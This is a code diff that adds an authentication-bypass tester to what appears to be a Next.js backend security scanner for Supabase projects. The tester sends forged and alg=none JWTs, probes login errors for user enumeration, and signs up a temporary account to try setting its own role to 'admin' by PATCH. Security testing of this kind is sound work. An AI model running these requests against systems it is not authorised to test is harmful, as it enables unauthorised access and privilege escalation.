@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 export const runtime = 'nodejs'
 
-export type BackendType = 'supabase' | 'firebase-rtdb' | 'firebase-firestore' | 'generic'
+export type BackendType = 'supabase' | 'firebase-rtdb' | 'firebase-firestore' | 'generic' | 'auth-test'
 
 export interface EndpointResult {
   endpoint:     string
@@ -41,13 +41,13 @@ const SUPABASE_FALLBACK_TABLES = [
   'rate_limits', 'roles', 'permissions',
 ]
 
-async function safeFetch(url: string, headers: Record<string, string>) {
+async function safeFetch(url: string, headers: Record<string, string>, body?: string, method = 'GET') {
   try {
-    const res  = await fetch(url, { headers, signal: AbortSignal.timeout(TIMEOUT_MS) })
+    const res  = await fetch(url, { method, headers, body, signal: AbortSignal.timeout(TIMEOUT_MS) })
     const text = await res.text()
-    let body: unknown = text
-    try { body = JSON.parse(text) } catch { /* keep raw */ }
-    return { status: res.status, body, size: text.length }
+    let parsed: unknown = text
+    try { parsed = JSON.parse(text) } catch { /* keep raw */ }
+    return { status: res.status, body: parsed, size: text.length }
   } catch { return null }
 }
 
@@ -256,20 +256,86 @@ async function probeGeneric(baseUrl: string, apiKey: string, extraHeaders: strin
   return { backendType:'generic', baseUrl:url, schemaReachable: results.some(r=>r.accessible), tablesProbed:paths.length, results, discoveredTables:[], storageBucket:null }
 }
 
+// ── Auth Bypass Tester ────────────────────────────────────────────────────────
+export interface AuthTestResult {
+  backendType: 'auth-test'
+  baseUrl: string
+  tests: { label: string; result: string; severity: 'critical'|'high'|'medium'|'info'|'safe'; detail: string }[]
+}
+
+async function testAuthBypass(baseUrl: string, anonKey: string, profileTable: string): Promise<AuthTestResult> {
+  const url     = baseUrl.replace(/\/$/, '')
+  const authUrl = `${url}/auth/v1`
+  const restUrl = `${url}/rest/v1`
+  const headers = { apikey: anonKey, 'Content-Type': 'application/json', Accept: 'application/json' }
+  const tests: AuthTestResult['tests'] = []
+
+  // 1. JWT forgery — invalid signature
+  const forgedJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYXV0aGVudGljYXRlZCIsInN1YiI6InRlc3QifQ.invalidsignature'
+  const forgeryRes = await safeFetch(`${restUrl}/${profileTable}?limit=1`, { ...headers, Authorization: `Bearer ${forgedJwt}` })
+  tests.push({ label: 'JWT forgery (invalid sig)', result: forgeryRes?.status === 401 ? 'BLOCKED' : 'VULNERABLE', severity: forgeryRes?.status === 401 ? 'safe' : 'critical', detail: forgeryRes?.status === 401 ? 'Signature validation working' : `HTTP ${forgeryRes?.status} — accepts forged JWT` })
+
+  // 2. alg=none attack
+  const noneJwt = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic2VydmljZV9yb2xlIiwic3ViIjoidGVzdCJ9.'
+  const noneRes = await safeFetch(`${restUrl}/${profileTable}?limit=1`, { ...headers, Authorization: `Bearer ${noneJwt}` })
+  tests.push({ label: 'alg=none attack', result: noneRes?.status === 401 ? 'BLOCKED' : 'VULNERABLE', severity: noneRes?.status === 401 ? 'safe' : 'critical', detail: noneRes?.status === 401 ? 'Algorithm validation working' : `HTTP ${noneRes?.status} — accepts unsigned JWT` })
+
+  // 3. User enumeration
+  const emails = ['admin@test.com', 'test@test.com', 'notexist@test.com']
+  const enumErrors = new Set<string>()
+  for (const email of emails) {
+    const r = await safeFetch(`${authUrl}/token?grant_type=password`, { ...headers }, `{"email":"${email}","password":"wrongpassword"}`, 'POST')
+    const b = r?.body as Record<string,unknown>
+    enumErrors.add(String(b?.error_code ?? b?.error ?? r?.status))
+  }
+  const canEnum = enumErrors.size > 1
+  tests.push({ label: 'User enumeration via auth errors', result: canEnum ? 'VULNERABLE' : 'SAFE', severity: canEnum ? 'medium' : 'safe', detail: canEnum ? `Different error codes per email: ${[...enumErrors].join(', ')}` : 'Consistent error response — enumeration not possible' })
+
+  // 4. Privilege escalation — can we PATCH the role field?
+  // First register a temp account to test with
+  const tempEmail = `pentest-${Date.now()}@mailinator.com`
+  const regRes = await safeFetch(`${authUrl}/signup`, { ...headers }, `{"email":"${tempEmail}","password":"Pentest123!"}`, 'POST')
+  const regBody = regRes?.body as Record<string,unknown>
+  const userId = regBody?.id as string | undefined
+  const accessToken = regBody?.access_token as string | undefined
+
+  if (userId && accessToken) {
+    // Try to find and patch our profile row
+    const profileRes = await safeFetch(`${restUrl}/${profileTable}?limit=1`, { ...headers, Authorization: `Bearer ${accessToken}` })
+    const profileRows = Array.isArray(profileRes?.body) ? profileRes!.body as Record<string,unknown>[] : []
+    if (profileRows.length > 0) {
+      const profileId = profileRows[0].id as string
+      const patchRes = await safeFetch(`${restUrl}/${profileTable}?id=eq.${profileId}`, { ...headers, Authorization: `Bearer ${accessToken}`, Prefer: 'return=representation' }, '{"role":"admin"}', 'PATCH')
+      const patchRows = Array.isArray(patchRes?.body) ? patchRes!.body as Record<string,unknown>[] : []
+      const escalated = patchRows.length > 0 && patchRows[0].role === 'admin'
+      tests.push({ label: 'Privilege escalation (role self-patch)', result: escalated ? 'VULNERABLE' : 'SAFE', severity: escalated ? 'critical' : 'safe', detail: escalated ? `User can set own role to "admin" via PATCH ${profileTable} — broken access control` : 'Role field is protected or not patchable' })
+    } else {
+      tests.push({ label: 'Privilege escalation (role self-patch)', result: 'SKIP', severity: 'info', detail: 'No profile row returned after registration — could not test' })
+    }
+  } else {
+    tests.push({ label: 'Privilege escalation (role self-patch)', result: 'SKIP', severity: 'info', detail: 'Registration requires email confirmation — cannot auto-test' })
+  }
+
+  return { backendType: 'auth-test', baseUrl: url, tests }
+}
+
+
 // ── Router ────────────────────────────────────────────────────────────────────
 export async function GET(req: NextRequest) {
-  const type      = (req.nextUrl.searchParams.get('type') ?? 'supabase') as BackendType
-  const url       = req.nextUrl.searchParams.get('url')?.trim() ?? ''
-  const key       = req.nextUrl.searchParams.get('key')?.trim() ?? ''
-  const extraHdrs = req.nextUrl.searchParams.get('headers')?.trim() ?? ''
+  const type        = (req.nextUrl.searchParams.get('type') ?? 'supabase') as BackendType
+  const url         = req.nextUrl.searchParams.get('url')?.trim() ?? ''
+  const key         = req.nextUrl.searchParams.get('key')?.trim() ?? ''
+  const extraHdrs   = req.nextUrl.searchParams.get('headers')?.trim() ?? ''
+  const profileTbl  = req.nextUrl.searchParams.get('profileTable')?.trim() ?? 'profiles'
 
   if (!url) return NextResponse.json({ error: 'url parameter required' }, { status: 400 })
 
-  let result: ApiProbeResult
+  let result: ApiProbeResult | AuthTestResult
   try {
     if      (type === 'supabase')           result = await probeSupabase(url, key)
     else if (type === 'firebase-rtdb')      result = await probeFirebaseRTDB(url, key)
     else if (type === 'firebase-firestore') result = await probeFirestore(url, key)
+    else if (type === 'auth-test')          result = await testAuthBypass(url, key, profileTbl)
     else                                    result = await probeGeneric(url, key, extraHdrs)
   } catch (e) {
     return NextResponse.json({ error: String(e) }, { status: 200 })
